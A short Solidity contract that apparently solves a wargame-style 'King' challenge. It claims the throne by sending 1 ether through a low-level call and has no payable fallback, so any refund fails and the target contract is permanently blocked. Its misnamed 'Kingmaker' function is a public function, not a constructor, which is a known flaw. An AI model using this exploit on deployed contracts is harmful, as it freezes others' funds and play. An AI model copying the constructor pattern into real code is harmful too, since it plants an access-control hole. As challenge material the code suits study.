pragma solidity ^0.4.18;

contract King {
    function () external payable;
}

contract allhailtheking {
    King public king;
    function Kingmaker (address _king) public payable {
        king = King(_king);
    }

    function overthrow () public {
        address(king).call.value(1 ether)();
    }
}
